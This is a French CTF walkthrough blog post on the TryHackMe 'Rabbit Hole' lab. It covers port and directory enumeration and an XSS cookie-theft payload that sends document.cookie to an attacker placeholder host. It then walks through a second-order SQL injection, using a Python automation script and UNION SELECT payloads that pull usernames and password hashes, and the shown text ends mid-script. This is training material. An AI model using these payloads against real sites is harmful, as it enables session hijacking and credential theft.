<!doctype html><html lang=en><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1"><style>:root{--accent-color:#FF4D4D;--font-size:17.5px}</style><title>THM: Rabbit Hole</title>
<meta name=description content="Platforme: TryHackMe Lien: Rabbit Hole Niveau: Difficile OS: Linux Ce défi met l&amp;rsquo;accent sur les vulnérabilités liées aux injections SQL. Nous découvrons …"><meta name=keywords content="TryHackMe"><meta property="og:url" content="https://scorpiosec.com/fr/posts/thm-rabbithole/"><meta property="og:type" content="website"><meta property="og:title" content="THM: Rabbit Hole"><meta property="og:description" content="Platforme: TryHackMe Lien: Rabbit Hole Niveau: Difficile OS: Linux Ce défi met l&amp;rsquo;accent sur les vulnérabilités liées aux injections SQL. Nous découvrons …"><meta property="og:image" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png"><meta property="og:image:secure_url" content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png"><meta name=twitter:card content="summary_large_image"><meta name=twitter:title content="THM: Rabbit Hole"><meta name=twitter:description content="Platforme: TryHackMe Lien: Rabbit Hole Niveau: Difficile OS: Linux Ce défi met l&amp;rsquo;accent sur les vulnérabilités liées aux injections SQL. Nous découvrons …"><meta property="twitter:domain" content="https://scorpiosec.com/fr/posts/thm-rabbithole/"><meta property="twitter:url" content="https://scorpiosec.com/fr/posts/thm-rabbithole/"><meta name=twitter:image content="https://scorpiosec.com/images/THM-RabbitHole/RabbitHole.png"><link rel=canonical href=https://scorpiosec.com/fr/posts/thm-rabbithole/><link rel=stylesheet type=text/css href=/css/normalize.min.css media=print><link rel=stylesheet type=text/css href=/css/main.min.css><link id=dark-theme rel=stylesheet href=/css/dark.min.css><script src=/js/bundle.min.dbdc9b4541e086f12258f5155a48310ed9f06d931aacfe9b7c85f8699b1f5cb2.js integrity="sha256-29ybRUHghvEiWPUVWkgxDtnwbZMarP6bfIX4aZsfXLI="></script></head><body><script>setThemeByUserPref()</script><header class=header><nav class=header-nav><div class=avatar><a href=https://scorpiosec.com/><img src=/redscorpio.jpg alt=avatar></a></div><div class=nav-title><a class=nav-brand href=https://scorpiosec.com/>Scorpiosec</a></div><div class=nav-links><div class=nav-link><a href=https://scorpiosec.com/fr/posts/ aria-label=posts><span data-feather=book></span> Postes</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/projects/ aria-label=projects><span data-feather=code></span> Projets</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/tags/ aria-label=tags><span data-feather=tag></span> Tags</a></div><div class=nav-link><a href=https://scorpiosec.com/fr/categories/ aria-label=categories><span data-feather=folder></span> Catégories</a></div><div class=nav-link><a href=https://scorpiosec.com/ aria-label></a></div><div class="nav-link language-switcher"><a href=/posts/thm-rabbithole/>English</a></div><span class=nav-icons-divider></span><div class="nav-link dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a aria-hidden=true role=switch><span class=theme-toggle-icon data-feather=moon></span></a></div><div class=nav-link id=hamburger-menu-toggle><span class="sr-only hamburger-menu-toggle-screen-reader-target">menu</span>
<a aria-checked=false aria-labelledby=hamburger-menu-toggle id=hamburger-menu-toggle-target role=switch><span data-feather=menu></span></a></div><ul class="nav-hamburger-list visibility-hidden"><li class=nav-item><a href=https://scorpiosec.com/fr/posts/><span data-feather=book></span> Postes</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/projects/><span data-feather=code></span> Projets</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/tags/><span data-feather=tag></span> Tags</a></li><li class=nav-item><a href=https://scorpiosec.com/fr/categories/><span data-feather=folder></span> Catégories</a></li><li class=nav-item><a href=https://scorpiosec.com/></a></li><li class="nav-item dark-theme-toggle"><span class="sr-only dark-theme-toggle-screen-reader-target">theme</span>
<a role=switch><span class=theme-toggle-icon data-feather=moon></span></a></li></ul></div></nav></header><main id=content><div class="post container"><div class=post-header-section><h1>THM: Rabbit Hole</h1><small role=doc-subtitle></small><p class=post-date>9 min read |
<span class=post-date>29 Octobre 2024</span></p><ul class=post-tags><li class=post-tag><a href=https://scorpiosec.com/fr/tags/tryhackme>TryHackMe</a></li></ul></div><div class=post-content><ul><li>Platforme: TryHackMe</li><li>Lien: <a href=https://tryhackme.com/r/room/rabbitholeqq>Rabbit Hole</a></li><li>Niveau: Difficile</li><li>OS: Linux</li></ul><hr><p>Ce défi met l&rsquo;accent sur les vulnérabilités liées aux injections SQL. Nous découvrons une vulnérabilité d&rsquo;injection SQL de second ordre après plusieurs tentatives de Cross-Site Scripting (XSS) qui échouent. En utilisant cette vulnérabilité, nous récupérons des hachages de mots de passe, mais ils ne conduisent pas à un accès initial. En combinant un script python et une payload utilisant la commande <code>PROCESSLIST</code>, nous réussissons à extraire la requête contenant le mot de passe de l&rsquo;utilisateur <code>admin</code>, que nous utilisons pour nous connecter via SSH et lire le drapeau.</p><h2 id=balayage>Balayage</h2><pre tabindex=0><code>./nmap_scan.sh 10.10.233.57 Rabbit_Hole
</code></pre><p><strong>Results</strong></p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-shell data-lang=shell><span style=display:flex><span>Running detailed scan on open ports: 22,80
</span></span><span style=display:flex><span>Starting Nmap 7.94SVN <span style=color:#56b6c2>(</span> https://nmap.org <span style=color:#56b6c2>)</span> at 2024-10-29 18:11 CDT
</span></span><span style=display:flex><span>Nmap scan report <span style=color:#c678dd>for</span> 10.10.233.57
</span></span><span style=display:flex><span>Host is up <span style=color:#56b6c2>(</span>0.22s latency<span style=color:#56b6c2>)</span>.
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>PORT   STATE SERVICE VERSION
</span></span><span style=display:flex><span>22/tcp open  ssh     OpenSSH 8.9p1 <span style=color:#56b6c2>(</span>protocol 2.0<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>80/tcp open  http    Apache httpd 2.4.59 <span style=color:#56b6c2>((</span>Debian<span style=color:#56b6c2>))</span>
</span></span><span style=display:flex><span>| http-cookie-flags: 
</span></span><span style=display:flex><span>|   /: 
</span></span><span style=display:flex><span>|     PHPSESSID: 
</span></span><span style=display:flex><span>|_      httponly flag not <span style=color:#e5c07b>set</span>
</span></span><span style=display:flex><span>|_http-title: Your page title here :<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>|_http-server-header: Apache/2.4.59 <span style=color:#56b6c2>(</span>Debian<span style=color:#56b6c2>)</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span style=display:flex><span>Nmap <span style=color:#c678dd>done</span>: <span style=color:#d19a66>1</span> IP address <span style=color:#56b6c2>(</span><span style=color:#d19a66>1</span> host up<span style=color:#56b6c2>)</span> scanned in 14.03 seconds
</span></span></code></pre></div><p>Notre scan Nmap trouve deux ports ouverts 22 (SSH) et 80 (HTTP). En vue de faciliter notre énumération, mettons à jour le fichier <code>/etc/hosts</code> avec l&rsquo;adresse IP fournie et <code>rabbithole.thm</code>.</p><h2 id=enumération>Enumération</h2><p>À <code>http://rabbithole.thm/</code>, nous trouvons un site web pour une campagne de recrutement avec une fonction d&rsquo;authentification, qui indique que &ldquo;des mesures anti-bruteforce sont mises en place&rdquo;.</p><p><img src=/images/THM-RabbitHole/rabbit_hole_website.png alt="Rabbit Hole website"></p><p>Créons un compte et connectons-nous.</p><p><img src=/images/THM-RabbitHole/rabbithole_register.png alt="Account registration"></p><p>Sur la page de connexion, nous remarquons un message différent. Il nous indique que les mesures anti-bruteforce sont <code>mises en œuvre à l'aide de requêtes de base de données</code></p><p><img src=/images/THM-RabbitHole/rabbithole_loginpage.png alt="Login page"></p><p>Après s&rsquo;être connecté, nous trouvons une page affichant les dernières connexions des utilisateurs.</p><p><img src=/images/THM-RabbitHole/rabbithole_logins.png alt="Users last logins"></p><p>Nous ne pouvons rien faire d&rsquo;autre sur cette page que de se déconnecter. Mais si nous prêtons attention aux temps de connexion pour <code>admin</code>, nous remarquons que l&rsquo;utilisateur se connecte <strong>toutes les minutes</strong>, ce qui est étrange. De plus, notre nom d&rsquo;utilisateur est reflété sur le site web, ce qui peut impliquer une possibilité d&rsquo;attaques telles que XSS, SQLi, et plus encore.</p><p>Avant d&rsquo;explorer les possibles vulnérabilités, énumérons un peu plus la cible.</p><pre tabindex=0><code>gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://rabbithole.thm
</code></pre><p><img src=/images/THM-RabbitHole/rabbithole_gobuster.png alt="Gobuster directory enumeration"></p><p>L&rsquo;énumération des répertoires étant infructueuse, nous passons à l&rsquo;énumération des sous-domaines.</p><pre tabindex=0><code>ffuf -c -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --fc 404 -t 100 -u http://rabbithole.thm -H &#34;Host: FUZZ.axlle.htb&#34; -ic -fs 723
</code></pre><p>Celle-ci ne fournit également aucune piste.</p><p><img src=/images/THM-RabbitHole/rabbithole_ffuf.png alt="Ffuf subdomain enumeration"></p><p>Nous remarquons que la valeur de notre cookie est la même pour différentes connexions, ce qui n&rsquo;est pas recommandé. Cela permettrait aux attaquants d&rsquo;exécuter certaines attaques de session telles que la fixation de session et les attaques par rejeu (replay attack). Dans notre cas, cela signifie que si nous parvenons à mettre la main sur la valeur du cookie de l&rsquo;administrateur, nous pourrons probablement nous connecter en son nom.</p><p><img src=/images/THM-RabbitHole/cookievalue_loggedin.png alt="cookie value first login"></p><p><img src=/images/THM-RabbitHole/2nd_login.png alt="cookie value second login"></p><h3 id=tentative-de-xss>Tentative de XSS</h3><p>Tentons un vol de cookie, puisque la valeur du paramètre <code>username</code> est reflétée, nous allons l&rsquo;utiliser.</p><p><img src=/images/THM-RabbitHole/burp_req.png alt="Burp request"></p><p>Nous sommes en mesure d&rsquo;enregistrer un compte avec le payload ci-dessous comme <code>username</code>.</p><pre tabindex=0><code>&lt;script&gt;var i=new Image(); i.src=&#34;http://YOUR_IP:WEBSERVER_PORT/?cookie=&#34;+btoa(document.cookie);&lt;/script&gt;
</code></pre><p><img src=/images/THM-RabbitHole/payload_as_username.png alt="Payload for username"></p><p>Mais la connexion avec ce compte produit une erreur. Elle révèle que l&rsquo;application utilise MariaDB, une version modifiée de MySQL.</p><p><img src=/images/THM-RabbitHole/login_error_SQLi.png alt="Payload Login error"></p><p>Il semblerait que nous soyons en présence d&rsquo;une <strong>injection SQL de second ordre</strong>. Nous avons injecté le code malveillant via notre payload lors de l&rsquo;enregistrement du compte et il a été exécuté lors de la connexion. Puisque le payload n&rsquo;a pas créé de problèmes lors de l&rsquo;enregistrement, nous savons que le caractère <code>"</code> est celui qui pose problème ici, ce qui est une bonne chose puisqu&rsquo;il nous servira pour nos SQLis ultérieures.</p><p>En vérifiant notre serveur web, nous constatons que nous avons reçu des valeurs de cookies.</p><p><img src=/images/THM-RabbitHole/cookie_value_xss.png alt="cookie value received"></p><p>Malheureusement, à chaque fois que j&rsquo;essaie d&rsquo;utiliser l&rsquo;un d&rsquo;entre eux, je suis déconnecté. Intéressons-nous maintenant à une autre voie d&rsquo;attaque.</p><h3 id=injection-sql-de-second-ordre>Injection SQL de second ordre</h3><p>Ce processus d&rsquo;exploitation est pénible: pour tester les différents payloads SQLi, nous devons créer un nouvel utilisateur et nous connecter pour pouvoir lire les résultats de la requête, ce qui n&rsquo;est pas idéal.</p><p>Nous allons donc automatiser le processus avec le script Python ci-dessous.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sys</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/register.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;submit&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>status_code</span> <span style=color:#56b6c2>==</span> <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/login.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;login&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>main</span>():
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>) <span style=color:#56b6c2>!=</span> <span style=color:#d19a66>3</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;Usage: python3 auto_sqli.py &lt;IP_ADDRESS&gt; &lt;PAYLOAD&gt;&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>exit</span>(<span style=color:#d19a66>1</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>ip</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>1</span>]
</span></span><span style=display:flex><span>    <span style=color:#e06c75>payload</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>sys</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>argv</span>[<span style=color:#d19a66>2</span>]
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[+] Creating user with payload: </span><span style=color:#98c379>{</span><span style=color:#e06c75>payload</span><span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] User created successfully. Attempting login...&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e06c75>response_text</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Login response:&#34;</span>)
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#e06c75>response_text</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>else</span>:
</span></span><span style=display:flex><span>        <span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[-] Failed to create user. Check the payload or connection.&#34;</span>)
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>if</span> <span style=color:#e06c75>__name__</span> <span style=color:#56b6c2>==</span> <span style=color:#98c379>&#34;__main__&#34;</span>:
</span></span><span style=display:flex><span>    <span style=color:#e06c75>main</span>()
</span></span></code></pre></div><p>Nous utilisons notre script pour trouver le nombre de colonnes escomptées.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_test.png alt="Second Order SQLi test"></p><p>Nous pouvons lire le message d&rsquo;erreur <code>SQLSTATE[21000]: Cardinality violation: 1222 The used SELECT statements have a different number of columns</code>.</p><p>Augmentons le nombre de colonnes avec le payload suivant.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, 2; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_test2.png alt="Second Order SQLi test2"></p><p>Ce payload fonctionne, confirmant que <strong>2</strong> colonnes sont nécessaires.</p><p>Il serait bon de savoir sur quelle base de données nous travaillons actuellement.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, database(); --&#39;
</code></pre><blockquote><p>Si vous remarquez que l&rsquo;adresse IP est différente, c&rsquo;est parce que j&rsquo;avais perdu certaines captures d&rsquo;écran et j&rsquo;ai dû recommencer le processus d&rsquo;exploitation avec une adresse IP différente pour les reprendre.</p></blockquote><p><img src=/images/THM-RabbitHole/current_DB.png alt="Second Order SQLi test2"></p><p>Nous sommes actuellement dans la base de données <code>web</code>, nous allons maintenant énumérer ses tables.</p><p><img src=/images/THM-RabbitHole/S_SQLi_enum.png alt="web database content"></p><p>Nous découvrons deux tables <code>users</code> et <code>logins</code>, la première semble intéressante.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, column_name FROM information_schema.columns WHERE table_name=&#34;users&#34; AND table_schema=DATABASE(); --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_enum2.png alt="users table fields"></p><p>Cette table comporte quatre champs : <code>id</code>, <code>username</code>, <code>password</code>, et <code>group</code>. Nous allons d&rsquo;abord vérifier <code>username</code> pour voir s&rsquo;il y a d&rsquo;autres utilisateurs.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, username FROM web.users; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/username_list.png alt="username field content"></p><p>En plus de <code>admin</code>, nous trouvons <code>foo</code> et <code>bar</code>.</p><p>Listons maintenant le contenu de <code>password</code>.</p><pre tabindex=0><code>python3 auto_sqli.py IP_ADDRESS &#39;&#34; UNION SELECT 1, password FROM web.users; --&#39;
</code></pre><p><img src=/images/THM-RabbitHole/S_SQLi_enum3.png alt="incomplete hashes"></p><p>Nous sommes capables d&rsquo;extraire les hashs mais il y a une limite de 16 caractères, ce qui donne des hashs incomplets. Afin de surmonter cet obstacle, nous modifions notre script en utilisant <code>SUBSTRING</code> pour diviser la requête en deux parties.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>sys</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>import</span> <span style=color:#e06c75>requests</span>
</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>bs4</span> <span style=color:#c678dd>import</span> <span style=color:#e06c75>BeautifulSoup</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>create_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/register.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;submit&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>status_code</span> <span style=color:#56b6c2>==</span> <span style=color:#d19a66>200</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>login_user</span>(<span style=color:#e06c75>ip</span>, <span style=color:#e06c75>payload</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>url</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>f</span><span style=color:#98c379>&#34;http://</span><span style=color:#98c379>{</span><span style=color:#e06c75>ip</span><span style=color:#98c379>}</span><span style=color:#98c379>/login.php&#34;</span>
</span></span><span style=display:flex><span>    <span style=color:#e06c75>data</span> <span style=color:#56b6c2>=</span> {
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;username&#39;</span>: <span style=color:#e06c75>payload</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;password&#39;</span>: <span style=color:#98c379>&#39;password&#39;</span>,
</span></span><span style=display:flex><span>        <span style=color:#98c379>&#39;login&#39;</span>: <span style=color:#98c379>&#39;Submit Query&#39;</span>
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>    <span style=color:#e06c75>response</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>requests</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>post</span>(<span style=color:#e06c75>url</span>, <span style=color:#e06c75>data</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>data</span>)
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>response</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>text</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>extract_results</span>(<span style=color:#e06c75>html</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>soup</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>BeautifulSoup</span>(<span style=color:#e06c75>html</span>, <span style=color:#98c379>&#39;html.parser&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>results</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>td</span> <span style=color:#56b6c2>in</span> <span style=color:#e06c75>soup</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>find_all</span>(<span style=color:#98c379>&#39;td&#39;</span>):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>content</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>td</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>get_text</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()
</span></span><span style=display:flex><span>        <span style=color:#7f848e># Filter out timestamp entries (they start with year)</span>
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#56b6c2>not</span> <span style=color:#e06c75>content</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>startswith</span>(<span style=color:#98c379>&#39;202&#39;</span>):  <span style=color:#7f848e># Assumes timestamps start with 202x</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>results</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>append</span>(<span style=color:#e06c75>content</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>return</span> <span style=color:#e06c75>results</span>
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>modify_payload</span>(<span style=color:#e06c75>payload</span>, <span style=color:#e06c75>substring_range</span>):
</span></span><span style=display:flex><span>    <span style=color:#e06c75>select_pos</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>upper</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>find</span>(<span style=color:#98c379>&#39;SELECT&#39;</span>)
</span></span><span style=display:flex><span>    <span style=color:#e06c75>from_pos</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>upper</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>find</span>(<span style=color:#98c379>&#39;FROM&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#c678dd>if</span> <span style=color:#e06c75>select_pos</span> <span style=color:#56b6c2>==</span> <span style=color:#56b6c2>-</span><span style=color:#d19a66>1</span> <span style=color:#56b6c2>or</span> <span style=color:#e06c75>from_pos</span> <span style=color:#56b6c2>==</span> <span style=color:#56b6c2>-</span><span style=color:#d19a66>1</span>:
</span></span><span style=display:flex><span>        <span style=color:#c678dd>return</span> <span style=color:#e06c75>payload</span>
</span></span><span style=display:flex><span>        
</span></span><span style=display:flex><span>    <span style=color:#e06c75>select_clause</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span>[<span style=color:#e06c75>select_pos</span>:<span style=color:#e06c75>from_pos</span>]
</span></span><span style=display:flex><span>    <span style=color:#e06c75>rest_of_query</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>payload</span>[<span style=color:#e06c75>from_pos</span>:]
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>columns</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>select_clause</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>replace</span>(<span style=color:#98c379>&#39;SELECT&#39;</span>, <span style=color:#98c379>&#39;&#39;</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()<span style=color:#56b6c2>.</span><span style=color:#e06c75>split</span>(<span style=color:#98c379>&#39;,&#39;</span>)
</span></span><span style=display:flex><span>    
</span></span><span style=display:flex><span>    <span style=color:#e06c75>modified_columns</span> <span style=color:#56b6c2>=</span> []
</span></span><span style=display:flex><span>    <span style=color:#c678dd>for</span> <span style=color:#e06c75>i</span>, <span style=color:#e06c75>col</span> <span style=color:#56b6c2>in</span> <span style=color:#e5c07b>enumerate</span>(<span style=color:#e06c75>columns</span>):
</span></span><span style=display:flex><span>        <span style=color:#e06c75>col</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>col</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>()
</span></span><span style=display:flex><span>        <span style=color:#c678dd>if</span> <span style=color:#e06c75>i</span> <span style=color:#56b6c2>==</span> <span style=color:#e5c07b>len</span>(<span style=color:#e06c75>columns</span>) <span style=color:#56b6c2>-</span> <span style=color:#d19a66>1</span>:  <span style=color:#7f848e># Last column</span>
</span></span><span style=display:flex><span>            <span style=color:#7f848e># Handle both simple columns and expressions</span>
</span></span><span style=display:flex><span>            <span style=color:#e06c75>col_content</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>col</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>strip</span>(<span style=color:#98c379>&#39;1234567890 &#39;</span>)  <span style=color:#7f848e># Remove any numeric values</span>
